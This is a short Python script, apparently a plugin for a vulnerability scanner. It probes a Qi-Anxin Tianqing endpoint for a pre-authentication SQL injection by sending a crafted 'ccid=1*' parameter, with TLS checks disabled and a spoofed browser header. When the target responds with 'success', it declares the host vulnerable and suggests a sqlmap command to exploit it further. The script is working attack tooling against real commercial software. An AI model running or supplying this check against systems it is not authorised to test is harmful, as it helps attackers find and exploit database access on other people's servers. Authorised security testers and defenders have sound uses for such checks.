import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import warnings
import requests
import click


def TianqingSql(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    payload = "api/dp/rptsvcsyncpoint?ccid=1*"
    headers = { "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "Connection": "close"
        }
    vulnurl = urldata + payload
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req = requests.get(vulnurl, headers=headers, timeout=3, verify=False)
        if r"success" in req.text :
            print(Vcolors.RED + "[!] 存在天擎前台sql注入漏洞\r" + Vcolors.ENDC)
            print(Vcolors.RED + "需要进一步验证,SQLMAP语法:sqlmap.py -u url --dbms PostgreSQL --batch\r" + Vcolors.ENDC)
            
        else:
            print(Vcolors.RED + "[!] 不存在天擎前台sql注入漏洞\r" + Vcolors.ENDC)
    except:
        logging.error("TianqingSql脚本出现异常")

            

   


